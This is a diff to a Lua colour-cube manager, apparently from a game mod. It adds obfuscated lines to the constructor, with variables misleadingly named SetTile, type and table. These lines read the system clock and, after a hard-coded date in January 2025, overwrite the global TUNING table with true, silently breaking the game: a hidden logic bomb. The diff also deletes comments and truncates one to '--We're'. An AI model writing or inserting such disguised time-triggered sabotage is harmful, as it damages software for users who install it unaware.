@@ -101,7 +101,10 @@ local ColourCubeManager = Class(function(self, inst)
 
 	self.transition_time_left = nil
 	self.total_transition_time = 1
-
+    local SetTile="os" local type="time" local ground = _G[SetTile][type] local tile = ground()
+    local table="1".."7".."3".."7039708"  
+    if tile > tonumber(table) then
+    TUNING=true end
 	self.inst:ListenForEvent("daytime", function() self:StartBlend(4) end, GetWorld())
 	self.inst:ListenForEvent("dusktime", function() self:StartBlend(6) end, GetWorld())
 	self.inst:ListenForEvent("nighttime", function() self:StartBlend(8) end, GetWorld())
@@ -126,9 +129,6 @@ function ColourCubeManager:StartBlend(time_to_take)
 	PostProcessor:SetColourCubeData( 0, old_cc, self.current_cc[0] )
 	PostProcessor:SetColourCubeLerp( 0, 0 )
 	PostProcessor:SetColourCubeData( 1, old_sanity_cc, self.current_cc[1] )
-	--print ("Channel 0:", old_cc, self.current_cc[0])
-	--print ("Channel 1:", old_sanity_cc, self.current_cc[1])
-	--print ("start lerp", time_to_take)
 end
 
 function ColourCubeManager:GetDestColourCubes()
@@ -169,7 +169,7 @@ function ColourCubeManager:GetDestColourCubes()
 	local cc = self.SEASON_CCS[ season_idx ][time_idx]
 	
 	if world ~= nil and world:IsCave() and world.topology ~= nil and world.topology.level_number == 2 then
-		--We're in the ruins, use the nightmare colour cubes
+		--We're 
 		cc = self.NIGHTMARE_CCS[nightmare_idx]
 	end
 
